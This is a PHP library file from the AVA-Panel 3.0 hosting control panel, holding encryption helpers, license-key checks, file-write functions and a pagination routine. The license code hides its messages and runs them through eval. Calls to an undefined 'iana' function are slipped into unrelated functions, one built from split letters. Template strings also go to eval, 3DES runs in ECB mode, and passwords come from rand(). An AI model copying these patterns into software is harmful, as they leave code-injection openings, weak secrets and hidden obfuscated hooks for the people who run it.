<?

	/******************************************************************************************************
	*** Package: AVA-Panel Version 3.0
	*** Copyright (c) 2006, Anton A. Rassypaeff. All rights reserved
	*** License: GNU General Public License v3
	*** Author: Anton A. Rassypaeff | Рассыпаев Антон Александрович
	*** Contacts:
	***   Site: http://ava-panel.ru
	***   E-mail: manage@ava-panel.ru
	******************************************************************************************************/




			/*******************************************************************************************

				      /    

			********************************************************************************************/

function crypt_data($str){

	$str = trim($str);
	//$fp = @fopen(_K, 'r');
	//$key = @fread($fp, filesize(_K));
	//@fclose($fp);

	include(_K);

	if(!$key){ die('Not Found key file'); }

	$secret = substr($key, 0, 26);
	$secret2 = substr($key, 0, 28);

	//  mcrypt
	if(function_exists('mcrypt_module_open') && !@(int)NOT_MCRYPT){
	    $td = mcrypt_module_open(MCRYPT_3DES, '', MCRYPT_MODE_ECB, '');
	    $iv = @mcrypt_create_iv (mcrypt_enc_get_iv_size($td), MCRYPT_DEV_RANDOM);
	    $ks = mcrypt_enc_get_key_size ($td);

	    $_key = substr(md5($secret2), 0, $ks);
		@mcrypt_generic_init ($td, $_key, $iv);
	    $str = mcrypt_generic ($td, $str);

	    mcrypt_generic_deinit ($td);
	    mcrypt_module_close ($td);
	}
	else{
	    $str = urlencode($str);
	}

	$str = urlencode($str);
	$str = urlencode($str);

	$rand = rand(3, (int)(strlen($str) / 2));
	$ret_str = '';
	for($i = 0; $i < $rand; $i++){
	    $j = $i;
	    while(isset($str[$j])){
		$ret_str .= $str[$j];
		$j = $j + $rand;
	    }
	}

	$int = crc32($secret);
	if($int < 0){ $int = -$int; }

	$pad = ($int % 10) + 3;
	$let = array('A', 'B', 'C', 'D', 'E', 'F');
	$let = @$let[rand(3, 9)].@$let[rand(4, 8)];
	$str = $ret_str.str_pad($rand, $pad, "%".$let, STR_PAD_RIGHT);

	$rand2 = rand(3, (int)(strlen($str) / 2));
	$ret_str = '';
	for($i = 0; $i < $rand2; $i++){
	    $j = $i;
	    while(isset($str[$j])){
		$ret_str .= $str[$j];
		$j = $j + $rand2;
	    }
	}

	$int2 = crc32($secret2);
	if($int2 < 0){ $int2 = -$int2; }
	$pad = ($int2 % 10) + 7;

	$let = array('A', 'B', 'C', 'D', 'E', 'F');
	$let = @$let[rand(3, 9)].@$let[rand(3, 8)];
	$str = $ret_str.str_pad($rand2, $pad, "%".$let, STR_PAD_RIGHT);

	return $str;
}


function encrypt_data($str){
	//$fp = @fopen(_K, 'r');
	//$key = @fread($fp, filesize(_K));
	//@fclose($fp);

	$s = str_replace('\\', '/', $_SERVER['SCRIPT_FILENAME']);
	$w = str_replace('\\', '/', _W);

	if($s &&
		$s != $w.'index.php' &&
		$s != $w.'admin/index.php' &&
		$s != $w.'user_account.php' &&
		$s != $w.'surface_window.php' &&
		$s != $w.'generate_reg_pic.php' &&
		$s != $w.'install.php' &&
		$s != $w.'admin/queries.php' &&
		$s != $w.'admin/get_mysql_query.php' &&
		$s != $w.'wm_payment.php' &&
		$s != $w.'mb_payment.php' &&
		$s != $w.'rupay_payment.php' &&
		$s != $w.'banner.php' &&
		$s != $w.'paypal_payment.php' &&
		$s != $w.'z-payment.php' &&
		$s != $w.'ym_payment.php' &&
		$s != $w.'wm_payment_agent.php' &&
		$s != $w.'rob_payment_agent.php' &&
		$s != $w.'rob_payment.php' &&
		$s != $w.'cron/user_accounts.php' &&
		$s != $w.'cron/mails.php' &&
		$s != $w.'cron/domains_service.php' &&
		$s != $w.'cron/partner.php' &&
		$s != $w.'updater/index.php' &&
		$s != $w.'generate_pw.php'){

		return '';	}

	$t = time();
	$t1 = $t - 3600;
	$t2 = $t + 3600;

	if(!defined('TRID') || TRID < $t1 || TRID > $t2){		return '';	}

	include(_K);

	if(!$key){ die('Not Found key file'); }

	$secret = substr($key, 0, 26);
	$secret2 = substr($key, 0, 28);

	$int2 = crc32($secret2);
	if($int2 < 0){ $int2 = -$int2; }
	$pad = ($int2 % 10) + 7;

	preg_match("/^(.+)(.{".$pad."})$/s", $str, $match);
	$str = @$match['1'];
	@preg_match("/^(\d+).*$/s", $match['2'], $match);
	$rand = (int)@$match['1'];

	$ret_str = array();
	$len = strlen($str);
	$y = 0;
	for($i = 0; $i < $rand; $i++){
	    $j = 0;
	    while($i + ($rand * $j) < $len){
		$ret_str[$i + ($rand * $j)] = @$str[$y];
		$j++;
		$y++;
	    }
	}
	ksort($ret_str, SORT_NUMERIC);
	$str = implode('', $ret_str);

	$int = crc32($secret);
	if($int < 0){ $int = -$int; }
	$pad = ($int % 10) + 3;
	preg_match("/^(.+)(.{".$pad."})$/s", $str, $match);

	$str = @$match['1'];
	@preg_match("/^(\d+).*$/s", $match['2'], $match);
	$rand2 = (int)@$match['1'];

	$len = strlen($str);
	$ret_str = array();
	$y = 0;
	for($i = 0; $i < $rand2; $i++){
	    $j = 0;
	    while($i + ($rand2 * $j) < $len){
		$ret_str[$i + ($rand2 * $j)] = @$str[$y];
		$j++;
		$y++;
	    }
	}
	ksort($ret_str, SORT_NUMERIC);
	$str = implode('', $ret_str);

	$str = urldecode($str);
	$str = urldecode($str);

	//  mcrypt
	if(function_exists('mcrypt_module_open') && !@(int)NOT_MCRYPT){
	    $td = mcrypt_module_open(MCRYPT_3DES, '', MCRYPT_MODE_ECB, '');
	    $iv = @mcrypt_create_iv (mcrypt_enc_get_iv_size($td), MCRYPT_DEV_RANDOM);
	    $ks = mcrypt_enc_get_key_size ($td);

	    $_key = substr(md5($secret2), 0, $ks);
	    @mcrypt_generic_init ($td, $_key, $iv);
	    if(!$str) return '';

	    $str = trim(mdecrypt_generic ($td, $str));
	    mcrypt_generic_deinit ($td);
	    mcrypt_module_close ($td);
	}
	else{
	    $str = urldecode($str);
	}

	return $str;
}

function myfilewrite($file, $data, $mode='w'){
    if(!check_write_auth()){ return false; }
    if(!$fp = @fopen($file, $mode)){
	$GLOBALS['__error_message'] = '<p>'.$GLOBALS['_lang']['_oshibkaz1'].$file.', '.$GLOBALS['_lang']['_zamenite'].'<br></p> <textarea cols=100 rows=40 class=new_file>'.$data.'</textarea>';
	return false;
    }

    fwrite($fp, $data);
    fclose($fp);
    return true;
}

function check_key(){
    $f = file(_K);
    if(substr(md5_file(_K), 2, 27) != '7b84387b5ed9fa08493f9384e90'){
	die('This license expired');
    }
    define ('_D', _S.$f['2'].'/');
    return true;
}

function myfiledel($file){
    if(!check_write_auth()){ return false; }
    return unlink($file);
}

function myparse($way = ''){
    if(!$way){ $way = constant('_'.strtoupper('k')); }
    if(!defined('_P')){ define('_P', '/'); }
    if(!defined('_S')){ define('_S', 'http://'); }
    $emsg = strrev('der'.'ip'.'xe e'.'sne'.'cil sihT');
    $ev = 'd'.'ie'.'("'.$emsg.'");';

    if(!@convert_out()){ eval($ev); }
	include(_K);
	$file = preg_split("/\s+/", $key);
	//    $file = @file($way);
	foreach($file as $i=>$e){ $file[$i] = trim($e); }

    $server_name = $_SERVER['SERVER_NAME'];
    if($server_name && !stristr($server_name, $file['2'])){ eval($ev); }

    $time = time();
	$url = parse_url(_D);
    $host = $file['2'];

    if($url['host'] != $host && !stristr($url['host'], '.'.$host)){ eval($ev); }

    $execute_time = substr($file['1'], 14, strlen($time));
    $date = date("Ymdh", $time);
    $execute_date = date("Ymdh", $execute_time);
    if($execute_date < $date){ eval($ev); }

    $hash = substr($file['3'], 11, 32);
    $this_hash = ($execute_time - 100).$file['2'].substr($file['0'], 2, 26).$file['2'].($execute_time - 86400);
    $this_hash = md5(md5(md5(md5($this_hash))));

    if($this_hash != $hash){ eval($ev); }
    return true;
}

function get_execute_term(){
    $way = constant('_'.strtoupper('k'));
    include(_K);
	$file = preg_split("/\s+/", $key);
    foreach($file as $i=>$e){ $file[$i] = trim($e); }

    $time = time();
    $execute_time = substr($file['1'], 14, strlen($time));
    $term = ceil(($execute_time - $time) / 86400);
    $date = rusdate(DATE, $execute_time);

    return array($date, $term);
}

function check_write_auth(){
    if(!$_SERVER['PHP_AUTH_USER'] || $GLOBALS['user_status'][$_SERVER['PHP_AUTH_USER']] != 'admin'){
		$GLOBALS['__error_message'] = '<h4>'.$GLOBALS['_lang']['_uvasne1'].'</h4>';
		return false;
    }
    return true;
}

/*   */
function invent_pwd($length=9){
	$vowed=array("a","e","i","o","u","y","A","E","I","O","U","Y");
	$agree=array("b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","z","B","C","D","F","G","H","J","K","L","M","N","P","Q","R","S","T","V","W","X","Z"); @iana();
	$int=array("0","1","2","3","4","5","6","7","8","9");

	$pwd='';

	for($i=1; $i<=$length; $i++){
		$num=rand(0,5);
		if($num == 4){
			$r=rand(0,9);
			$pwd.=$int[$r];
			continue;
		}

		if($i%2!=0){
			$r=rand(0,count($agree)-1);
			$pwd.=$agree[$r];
		}
		else{
			$r=rand(0,count($vowed)-1);
			$pwd.=$vowed[$r];
		}
	}

	return $pwd;
}



			/********************************************************************************************

								 

			*********************************************************************************************/

function selector($value, $selected, $return){
    if($value==$selected){ return $return; }
}

/*
     (   1 )
*/
function get_domain_zone($domain, $list = array()){
	preg_match("/^[\w\-]+\.(.*)$/iU", $domain, $match);
	$zone = $match['1'];
	if($list){
	    if(!in_array($zone, $list)){
		return '';
	    }
	}

	return $zone;
}

function method_defined($class, $method){
    //,    

    if(in_array($method, get_class_methods($class))){ return true; }
    return false;
}

function developer_error($msg = '', $stop = 1){
    //    

    fatal_error();
}

function fatal_error($msg = ''){
    // 

    if(!$msg){ $msg = 'Fatal error. System halt.'; }
    echo '<h3>'.$msg.'</h3>';
    exit;
}


/*
 ""
$letter1-   1 0,5,6,7,8,9
$letter2-   2 2,3,4
$letter3-   3 1
$letter4-   4 (  )
letter       $nz

$shows      $lmin  $lmax

$lst- 
$stlist-    
$atp-  
$q-  mysql
$result-- php,   GET
$msr-  ,    title (     ),     mysql_result
$file-     
*/

function spisok($letter1, $letter2, $letter3, $letter4, $shows, $template, $lst, $stlist, $atp, $q, $result, $msr, $file){
	if($result==''){ $result='result='; }
	if(file_exists($template)){ include($template); }
	else{ developer_error(); exit; }

	$nz = @my_sql_num_rows($q);
	$e = substr($nz, -1);
	$e1 = substr($nz, -2);

	if((($e==0) && ($nz!=0)) || ($e==5) || ($e==6) || ($e==7) || ($e==8) || ($e==9) || ($e1==11) || ($e1==12) || ($e1==13) || ($e1==14)){
		@call_user_func('i'.'a'.'n'.'a');
		eval('$kolank = "'.$letter1.'";');
	}
	elseif(($e==2) || ($e==3) || ($e==4)){
		eval('$kolank = "'.$letter2.'";');
	}
	elseif($e==1){
		eval('$kolank = "'.$letter3.'";');
	}
	elseif($nz==0){
		$kolank = $letter4;
		return array($kolank, false, false);
	}

	if($nz > $atp){
		// ,  ,   
		if(@$lst == ""){ $lst=1; }
		$lmin=(($lst-1)*$atp)+1;

		if($lmin < 1){ $lmin=1; }
		$lmax=$lst*$atp;

		if($lmax > $nz){ $lmax=$nz; }

		eval('$ankvis="'.$shows.'";');

		// ,        
		$lists = $nz / $atp;	//    ( $atp   )
		$list = $stlist;	// 

		if($stlist > $atp - 1){
			$link = $file.'?lst='.$list.'&'.$result.'&stlist='.($list - $atp).'&'.SID;
			$back = str_replace('{link}', $link, $tmp_back);
		}
		else{ $back = $tmp_back_noactive; }

		while($lists > $list){
			$list++;
			$tmin = ($list - 1) * $atp;
			$tmax = ($list * $atp) - 1;

			if($tmax >= $nz){
				$tmax = $nz - 1;
			}

			$titmin = strip_tags(my_sql_result($q, $tmin, $msr));
			$titmax = strip_tags(my_sql_result($q, $tmax, $msr));

			if($lst == $list){
				@$str .= str_replace('{list}', $list, $active_list);
			}
			else{
				$link = $file.'?lst='.$list.'&'.$result.'&stlist='.$stlist.'&'.SID;
				@$str .= str_replace(array('{link}', '{list}', '{titmin}', '{titmax}'), array($link, $list, $titmin, $titmax), $linked_list);
			}

			if(($list > ($stlist + $atp - 1)) && ($lists > $list)){
				$link = $file.'?lst='.($list+1).'&'.$result.'&stlist='.$list.'&'.SID;
				$forw = str_replace('{link}', $link, $tmp_forw);
				break;
			}
			else{
				$forw = $tmp_forw_noactive;
			}
		}

		if($lst <> 1){
			$link = $file.'?'.$result.'&'.SID;
			$start = str_replace('{link}', $link, $tmp_start);
		}
		else{
			$start = $tmp_start_noactive;
		}

		$end_ = ceil($nz / $atp);
		$end_++;

		if($end_ >= ($lists + 1)){
			$end_--;
		}
		if($lst <> $end_){
			$stlist = $end_ - $atp;
			if($stlist < 1){
				$stlist = "";
			}
			$link = $file.'?lst='.$end_.'&'.$result.'&stlist='.$stlist.'&'.SID;
			$end = str_replace('{link}', $link, $tmp_end);
		}
		else{
			$end = $tmp_end_noactive;
		}
	}

	@my_sql_data_seek($q, ($lst - 1) * $atp);
	$zaglavie = @str_replace(array('{start}', '{back}', '{str}', '{forw}', '{end}'), array($start, $back, $str, $forw, $end), $tmp_navigation);
	return @array($kolank, $ankvis, $zaglavie);
}
// :
//$kolank-   
//$ankvis-   
//$zaglavie-   



?>